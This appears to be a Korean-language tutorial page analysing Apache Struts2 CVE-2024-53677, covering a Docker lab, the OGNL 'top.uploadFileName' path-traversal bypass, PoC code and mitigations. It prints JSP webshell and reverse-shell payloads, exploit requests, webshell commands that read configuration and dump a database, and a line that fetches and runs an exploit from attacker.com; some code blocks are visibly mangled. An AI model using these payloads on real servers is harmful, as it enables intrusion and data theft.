## 취약점 테스트

### Step 1. 환경 구성

**1. GitHub Repository 클론:**

<CodeBlock
  code={`git clone https://github.com/EQSTLab/CVE-2024-53677
cd CVE-2024-53677/docker`}
  id="setup-1"
/>

**2. Docker 이미지 빌드 및 실행:**

<CodeBlock
  code={`docker build --ulimit nofile=122880:122880 -m 3G -t cve-2024-53677 .
docker run -p 8080:8080 --ulimit nofile=122880:122880 -m 3G --rm -it --name cve-2024-53677 cve-2024-53677`}
  id="setup-2"
/>

**3. 취약한 페이지 접속 확인:**

```
http://192.168.0.5:8080/upload.action
```

파일 업로드 폼이 정상적으로 표시되는지 확인합니다.

---

### Step 2. PoC 다운로드 및 준비

**1. 공격자 머신에서 PoC 다운로드:**

<CodeBlock
  code="git clone https://github.com/EQSTLab/CVE-2024-53677"
  id="poc-1"
/>

**2. 업로드할 웹쉘 파일 생성:**

<CodeBlock
  code={`# test.txt (간단한 웹쉘 예시)
<%@ page import="java.io.*" %>
<%
                                                                                                                                                                                                                                                                                                                                                                                               
%>`}
  id="poc-2"
/>

---

### Step 3. 취약점 Exploit

**1. PoC 실행:**

<CodeBlock
  code="python3 CVE-2024-53677.py -u http://192.168.0.5:8080/upload.action -p ../test.jsp -f test.txt"
  id="exploit-1"
/>

**파라미터 설명:**

- `-u`: 타겟 업로드 URL
- `-p`: 업로드할 파일명 (경로 포함, `../`로 Path Traversal)
- `-f`: 로컬에 있는 업로드할 파일

**2. 웹쉘 접근:**

<CodeBlock
  code="curl 'http://192.168.0.5:8080/test.jsp?cmd=whoami'"
  id="exploit-2"
/>

**예상 결과:**

```
tomcat
```

**3. 추가 명령 실행:**

<CodeBlock
  code={`# 시스템 정보 확인
curl 'http://192.168.0.5:8080/test.jsp?cmd=uname+-a'

# 디렉토리 목록

curl 'http://192.168.0.5:8080/test.jsp?cmd=ls+-la'

# 환경 변수 확인

curl 'http://192.168.0.5:8080/test.jsp?cmd=env'`}
id="exploit-3"
/>

---

## Step 1. CVE-2023-50164 배경

### 1) 이전 취약점 원리

**CVE-2023-50164**는 HttpParameters 클래스의 대소문자 구분 문제로 발생했습니다.

**문제점:**

- `upload`와 `Upload` 파라미터가 별도로 취급됨
- TreeMap 정렬 순서: `Upload` (대문자) → `upload` (소문자)
- `Upload` 파라미터 값이 `uploadFileName`에 의해 재정의 가능

**공격 흐름:**

<CodeBlock
  code={`POST /upload.action HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKit

------WebKit
Content-Disposition: form-data; name="Upload"; filename="test.jpg"

[악성 파일 내용]
------WebKit
Content-Disposition: form-data; name="uploadFileName"

../webshell.jsp
------WebKit--`}
id="background-1"
/>

**결과:** `test.jpg` → `../webshell.jsp`로 재정의

---

### 2) CVE-2023-50164 패치

**변경 사항:**

1. **대소문자 무시 비교 추가:**

<CodeBlock
  code={`// 변경 전
if (name.equals("upload")) { ... }

// 변경 후
if (name.equalsIgnoreCase("upload")) { ... }`}
id="patch-1"
/>

2. **중복 파라미터 제거:**

<CodeBlock
  code={`// HttpParameters.remove() 메서드 개선
public void remove(String name) {
    // 대소문자 구분 없이 제거
    parameters.entrySet().removeIf(
        entry -> entry.getKey().equalsIgnoreCase(name)
    );
}`}
  id="patch-2"
/>

> ⚠️ **하지만**: OGNL 표현식을 통한 우회 가능성은 남아있었습니다!

---

## Step 2. CVE-2024-53677 상세 분석

### 1) Struts2 ValueStack 이해

**ValueStack이란?**

Struts2에서 사용하는 **스택 구조의 데이터 저장소**입니다.

**특징:**

- LIFO (Last In, First Out) 구조
- 최상위 객체부터 순차적으로 탐색
- OGNL 표현식을 통해 접근 가능

**ValueStack 구조 예시:**

```
┌─────────────────┐
│ CompoundRoot    │ <- ValueStack의 최상위
├─────────────────┤
│ Action Context  │ <- 현재 실행 중인 Action
├─────────────────┤
│ Parameters      │ <- HTTP 요청 파라미터
├─────────────────┤
│ Session         │
└─────────────────┘
```

---

### 2) 파라미터 바인딩 과정

**ParametersInterceptor.java 핵심 코드:**

<CodeBlock
  code={`// setParameters() 메서드
protected void setParameters(Object action, ValueStack stack, final Map<String, Object> parameters) {
    for (Map.Entry<String, Object> entry : parameters.entrySet()) {
        String name = entry.getKey();
        
        // ⚠️ 핵심: OGNL 표현식으로 ValueStack에 값 설정
        if (isAcceptableParameter(name, action)) {
            stack.setValue(name, entry.getValue());
        }
    }
}`}
  id="analysis-1"
/>

**디버깅으로 확인:**

<CodeBlock
  code={`POST /upload.action HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKit

------WebKit
Content-Disposition: form-data; name="Upload"; filename="test.jpg"

[파일 내용]
------WebKit--`}
id="analysis-2"
/>

**ValueStack 상태:**

```
stack[0] = Action 인스턴스
  ├─ upload = [UploadedFile]
  ├─ uploadFileName = "test.jpg"
  └─ uploadContentType = "image/jpeg"
```

---

### 3) 정규 표현식 필터링

**isAccepted() 메서드의 필터링 로직:**

<CodeBlock
  code={`// AcceptedPatternsChecker.java
private static final String ACCEPTED_PATTERN = "\\w+((\\.\\w+)|(\\[\\d+\\]))*";

public boolean isAccepted(String name) {
return Pattern.matches(ACCEPTED_PATTERN, name);
}`}
id="filter-1"
/>

**정규 표현식 분석:**

- `\\w+`: 한 글자 이상의 영문자, 숫자, 밑줄 (필수)
- `(\\.\\w+)`: 점(.)으로 시작하는 속성 접근 (선택)
- `(\\[\\d+\\])`: 대괄호로 인덱스 접근 (선택)

**통과하는 예시:**

- ✅ `uploadFileName`
- ✅ `user.name`
- ✅ `files[0]`

**차단되는 예시:**

- ❌ `[0].uploadFileName` (대괄호로 시작)
- ❌ `../uploadFileName` (특수문자로 시작)
- ❌ `#uploadFileName` (특수문자 포함)

---

### 4) OGNL 표현식을 이용한 우회

**핵심 아이디어: `top` 표현식 활용**

OGNL에서 `top`은 ValueStack의 최상위 객체를 의미합니다.

**등가 관계:**

- `name` = `top.name` = `[0].name`
- `uploadFileName` = `top.uploadFileName`

**우회 전략:**

<CodeBlock
  code={`// ❌ 차단됨: 대괄호로 시작
[0].uploadFileName = "../webshell.jsp"

// ✅ 우회 성공: top으로 시작
top.uploadFileName = "../webshell.jsp"`}
id="bypass-1"
/>

**왜 우회가 가능한가?**

1. `top.uploadFileName`은 `\\w+(\\.\\w+)` 패턴에 매칭됨
2. 정규 표현식 통과 ✅
3. OGNL 엔진이 `top.uploadFileName`을 평가하여 ValueStack의 `uploadFileName` 재정의

---

### 5) 실제 공격 흐름

**Step 2-1. 악성 요청 전송**

<CodeBlock
  code={`POST /upload.action HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKit

------WebKit
Content-Disposition: form-data; name="Upload"; filename="innocent.jpg"
Content-Type: image/jpeg

<%@ page import="java.io.\*" %>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
------WebKit
Content-Disposition: form-data; name="top.uploadFileName"

../EQST.jsp
------WebKit--`}
id="flow-1"
/>

**Step 2-2. 파라미터 바인딩**

<CodeBlock
  code={`// ParametersInterceptor.setParameters()
stack.setValue("top.uploadFileName", "../EQST.jsp");

// ⬇️ OGNL 엔진이 평가
stack.getRoot().get(0).setUploadFileName("../EQST.jsp");

// ⬇️ ValueStack 상태 변경
uploadFileName = "../EQST.jsp" // 재정의됨!`}
id="flow-2"
/>

**Step 2-3. 파일 저장**

<CodeBlock
  code={`// doUpload() 메서드
File destFile = new File(uploadPath, uploadFileName);  
// uploadPath = "/var/lib/tomcat/webapps/ROOT/uploads"
// uploadFileName = "../EQST.jsp"
// ⬇️ 실제 저장 경로
// /var/lib/tomcat/webapps/ROOT/EQST.jsp  (Path Traversal 성공!)`}
  id="flow-3"
/>

**Step 2-4. 웹쉘 실행**

<CodeBlock code="curl 'http://192.168.0.5:8080/EQST.jsp?cmd=id'" id="flow-4" />

---

### 6) 다중 파일 업로드 시나리오

배열 인덱스를 직접 지정하여 더 간단하게 공격 가능합니다.

**공격 요청:**

<CodeBlock
  code={`POST /uploads.action HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKit

------WebKit
Content-Disposition: form-data; name="Upload"; filename="file1.jpg"

[파일1 내용]
------WebKit
Content-Disposition: form-data; name="Upload"; filename="file2.jpg"

[파일2 내용]
------WebKit
Content-Disposition: form-data; name="uploadFileName[0]"

../malicious.jsp
------WebKit--`}
id="multi-1"
/>

**결과:**

- `file1.jpg` → `../malicious.jsp`로 저장 ✅
- `file2.jpg` → 정상 저장

**왜 가능한가?**

- `uploadFileName[0]`은 `\\w+\\[\\d+\\]` 패턴에 매칭됨
- 배열의 첫 번째 요소를 직접 수정

---

## Step 3. PoC 코드 분석

### CVE-2024-53677.py 주요 로직

<CodeBlock
  code={`import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

def exploit(url, path, file_path): # 1. 악성 파일 읽기
with open(file_path, 'rb') as f:
file_content = f.read()

    # 2. Multipart 요청 구성
    multipart_data = MultipartEncoder(
        fields={
            'Upload': ('innocent.jpg', file_content, 'image/jpeg'),
            'top.uploadFileName': path  # ⚠️ OGNL 표현식 삽입
        }
    )

    # 3. 요청 전송
    headers = {'Content-Type': multipart_data.content_type}
    response = requests.post(url, data=multipart_data, headers=headers)

    return response.status_code == 200`}

id="poc-code"
/>

**사용 예시:**

<CodeBlock
  code={`python3 CVE-2024-53677.py \\
    -u http://192.168.0.5:8080/upload.action \\
    -p ../webshell.jsp \\
    -f local_shell.txt`}
  id="poc-usage"
/>

---

## Step 4. 실전 공격 시나리오

### 시나리오 1: 데이터베이스 정보 탈취

**1. JDBC 설정 파일 확인:**

<CodeBlock
  code="curl 'http://192.168.0.5:8080/EQST.jsp?cmd=cat+/etc/tomcat/context.xml'"
  id="scenario-1"
/>

**2. DB 접속 정보 추출:**

<CodeBlock
  code={`curl -X POST 'http://192.168.0.5:8080/EQST.jsp' \\
  --data 'cmd=mysql+-u+dbuser+-pdbpass+-e+"SELECT+*+FROM+users"+mydb'`}
  id="scenario-2"
/>

---

### 시나리오 2: 리버스 쉘 획득

**1. 공격자 리스너 실행:**

<CodeBlock code="nc -lvnp 4444" id="scenario-3" />

**2. 리버스 쉘 페이로드 업로드:**

<CodeBlock
  code={`# reverse.jsp
<%@ page import="java.io.*,java.net.*" %>
<%
    String host = "192.168.216.129";
    int port = 4444;
    Socket s = new Socket(host, port);
    Process p = Runtime.getRuntime().exec("/bin/sh");
    // ... 리버스 쉘 코드
%>`}
  id="scenario-4"
/>

**3. 쉘 트리거:**

<CodeBlock code="curl http://192.168.0.5:8080/reverse.jsp" id="scenario-5" />

---

### 시나리오 3: 권한 상승 (sudo 취약점 악용)

<CodeBlock
  code={`# 1. sudo 버전 확인
curl 'http://192.168.0.5:8080/EQST.jsp?cmd=sudo+--version'

# 2. CVE-2021-3156 (Baron Samedit) 익스플로잇 다운로드

curl 'http://192.168.0.5:8080/EQST.jsp?cmd=wget+http://attacker.com/exploit+-O+/tmp/exploit'

# 3. 권한 상승

curl 'http://192.168.0.5:8080/EQST.jsp?cmd=/tmp/exploit'`}
id="scenario-6"
/>

---

## 대응 방안

### 1. 즉시 조치

**버전 확인:**

<CodeBlock
  code={`# Struts2 JAR 파일 찾기
find / -name "struts2*.jar" 2>/dev/null

# 버전 정보 확인

unzip -p struts2-core-\*.jar META-INF/MANIFEST.MF | grep -i version`}
id="mitigation-1"
/>

**취약 버전:**

- Struts 2.0.0 - 2.3.37
- Struts 2.5.0 - 2.5.33
- Struts 6.0.0 - 6.3.0.2

---

### 2. struts.xml 설정 확인

**취약한 설정 확인:**

<CodeBlock
  code={`# struts.xml 파일 찾기
find / -name "struts.xml" 2>/dev/null

# 취약한 Interceptor 사용 확인

grep -r "fileUpload" /path/to/struts.xml`}
id="mitigation-2"
/>

**❌ 취약한 설정:**

```xml
<interceptor-ref name="fileUpload"/>
```

**✅ 안전한 설정:**

```xml
<interceptor-ref name="actionFileUpload"/>
```

---

### 3. 업그레이드 가이드

**Maven 프로젝트:**

<CodeBlock
  code={`<!-- pom.xml -->
<properties>
    <struts2.version>6.4.0</struts2.version>
</properties>

<dependencies>
  <dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>\${struts2.version}</version>
  </dependency>
</dependencies>
`} id="mitigation-3" />

**Gradle 프로젝트:**

<CodeBlock
  code={`// build.gradle
dependencies {
    implementation 'org.apache.struts:struts2-core:6.4.0'
}`}
  id="mitigation-4"
/>

---

### 4. WAF 규칙 추가

**Nginx + ModSecurity:**

<CodeBlock
  code={`# /etc/modsecurity/custom-rules.conf
SecRule REQUEST_BODY "@rx top\\.uploadFileName|\\[\\d+\\]\\.upload" \\
    "id:1000,\\
    phase:2,\\
    deny,\\
    status:403,\\
    msg:'Struts2 CVE-2024-53677 Attack Detected',\\
    log"`}
  id="mitigation-5"
/>

---

### 5. 파일 업로드 보안 강화

<CodeBlock
  code={`// Java 코드 예시
public class SecureFileUpload {
    private static final List<String> ALLOWED_EXTENSIONS = 
        Arrays.asList("jpg", "jpeg", "png", "pdf");
    
    public boolean validateUpload(File file, String fileName) {
        // 1. 확장자 검증 (화이트리스트)
        String ext = fileName.substring(fileName.lastIndexOf(".") + 1).toLowerCase();
        if (!ALLOWED_EXTENSIONS.contains(ext)) {
            return false;
        }
        
        // 2. 경로 조작 방지
        if (fileName.contains("..") || fileName.contains("/") || fileName.contains("\\\\")) {
            return false;
        }
        
        // 3. MIME 타입 검증
        String contentType = Files.probeContentType(file.toPath());
        if (!contentType.startsWith("image/") && !contentType.equals("application/pdf")) {
            return false;
        }
        
        // 4. 파일 크기 제한
        if (file.length() > 10 * 1024 * 1024) {  // 10MB
            return false;
        }
        
        return true;
    }
}`}
  id="mitigation-6"
/>

---

## 종합 실습

### 실습 1: 전체 공격 체인 재현

<CodeBlock
  code={`# 1. 환경 구성
docker run -p 8080:8080 cve-2024-53677

# 2. 웹쉘 작성

cat > shell.txt << 'EOF'
<%@ page import="java.io.\*" %>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
EOF

# 3. PoC 실행

python3 CVE-2024-53677.py -u http://192.168.0.5:8080/upload.action -p ../shell.jsp -f shell.txt

# 4. 공격 성공 확인

curl 'http://192.168.0.5:8080/shell.jsp?cmd=whoami'`}
id="lab-1"
/>

---

### 실습 2: 패치 전후 비교

<CodeBlock
  code={`# 취약한 버전 (6.3.0.2)
docker run -p 8080:8080 struts:6.3.0.2
# ... 공격 성공 확인

# 패치된 버전 (6.4.0)

docker run -p 8081:8080 struts:6.4.0

# ... 공격 실패 확인 (403 Forbidden)`}

id="lab-2"
/>

> ⚠️ **실습은 반드시 허가된 환경에서만 수행하세요!**
